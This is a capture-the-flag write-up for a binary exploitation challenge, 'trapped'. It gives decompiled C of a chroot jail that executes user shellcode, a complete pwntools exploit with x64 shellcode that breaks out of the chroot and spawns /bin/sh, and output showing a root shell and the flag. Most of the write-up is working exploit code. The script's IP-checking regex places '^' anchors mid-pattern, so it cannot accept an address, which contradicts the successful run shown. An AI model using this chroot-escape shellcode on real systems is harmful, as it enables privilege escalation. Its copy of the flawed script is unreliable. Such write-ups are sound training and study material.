**Category**: Binary Exploitation  
**Author**: Wittner

![](./files/01%20-%20Trapped/01%20-%20Trapped.png)

---

The `trapped` file was a simple x64 ELF binary that implemented a chroot and then executed user provided shellcode:

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // eax
  int fd; // [rsp+0h] [rbp-C0h]
  void (*buf)(void); // [rsp+8h] [rbp-B8h]
  char templatea[32]; // [rsp+10h] [rbp-B0h] BYREF
  char haystack[136]; // [rsp+30h] [rbp-90h] BYREF
  unsigned __int64 v9; // [rsp+B8h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  strcpy(templatea, "/tmp/jail-XXXXXX");
  setup(argc, argv);
  v3 = geteuid();
  setreuid(v3, 0xFFFFFFFF);
  if ( mkdtemp(templatea) )
  {
    printf("Creating jail at: %s\n", templatea);
    puts("Which file would you like to open?");
    __isoc99_scanf("%s", haystack);
    if ( strstr(haystack, "flag") )
    {
      puts("Cannot open flag based files");
      return 1;
    }
    else if ( chroot(templatea) )
    {
      perror("chroot");
      return 1;
    }
    else
    {
      fd = open("/flag", 65);
      write(fd, "FLAG{FAKE}", 0xAuLL);
      close(fd);
      buf = (void (*)(void))mmap((void *)0x1337000, 0x1000uLL, 7, 34, 0, 0LL);
      if ( buf != (void (*)(void))20148224 )
        perror("mmap");
      puts("What would you like me to run next? ");
      if ( (unsigned int)read(0, buf, 0x1000uLL) )
        buf();
      else
        puts("Nothing read in, goodbye");
      return 0;
    }
  }
  else
  {
    perror("mkdtemp");
    return 1;
  }
}
```

Due to the use of `setreuid()`, the effective UID was maintained inside the chroot, making it trivial for to escape. All that was required was to provide a filename without `flag` in it and then some shellcode, which got stored in an RWX region allocated by `mmap` and then called via `buf()`.

I wrote the following exploit in Python to automate the process:

```Python
#!/usr/bin/env python3
from pwn import *
import sys
import re

def exploit(host, port):
    # My teammate saturn already yelled at me for this style. I KNOW...
    shellcode = b"".join([asm(o, arch="amd64", os="linux", bits=64) for o in [
        ## We're in /tmp/something, so double traverse to /.
        "xor rdi, rdi",
        "mov rdi, 0x2E2E", # "..\0"
        "push rdi",
        "mov rdi, rsp",  # use stack pointer as path string
        "mov rax, 0x50", # chdir() syscall
        "syscall",
        "mov rax, 0x50", # chdir() syscall
        "syscall",
        
        ## Change chroot to the current directory which is /.
        "xor rdi, rdi",
        "mov rdi, 0x2E", # "."
        "push rdi",
        "mov rdi, rsp",  # use stack pointer as path string
        "mov rax, 0xA1", # chroot() syscall
        "syscall",
        
        ## execve("/bin/sh", ["/bin/sh", null], null);
        "xor rdi, rdi",
        "push rdi",
        "mov rdi, 0x68732F6E69622F2F", # "//bin/sh" - extra slash to pad out the null byte
        "push rdi",
        "mov rdi, rsp",  # use stack pointer as path string
        "xor rsi, rsi",
        "push rsi",
        "push rdi",
        "mov rsi, rsp",  # use stack pointer as argv array
        "xor rdx, rdx",
        "mov rax, 0x3B", # execve() syscall
        "syscall",
    ]])

    sock = remote(host, port)
    sock.recvuntil(b"Which file would you like to open?")
    sock.sendline(b"test")
    sock.recvuntil(b"What would you like me to run next?")
    sock.sendline(shellcode)
    sock.interactive()

def usage():
    print("Usage: %s <host> <port>" % sys.argv[0])
    sys.exit()
    
def main():
    if len(sys.argv) < 3:
        usage()
        
    if not re.match("^\d{1,3}\.^\d{1,3}\.^\d{1,3}\.^\d{1,3}$", sys.argv[1]):
        usage()
        
    try:
        exploit(sys.argv[1], int(sys.argv[2]))
    except:
        usage()

if __name__ == "__main__":
    main()
```

That's not the smallest or most optimal shellcode in the world, but that doesn't matter much for this challenge.

```
$ python solve.py 10.1.205.185 9999
[+] Opening connection to 10.1.205.185 on port 9999: Done
[*] Switching to interactive mode
 
$ id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
$ cat /flag.txt
flag{5f8c037a7ca4cb89c80174bca5eaf531}
```

Flag: **flag{5f8c037a7ca4cb89c80174bca5eaf531}**

---

**Files:**
- [solve.py](./files//01%20-%20Trapped/solve.py)
- [trapped](./files//01%20-%20Trapped/trapped)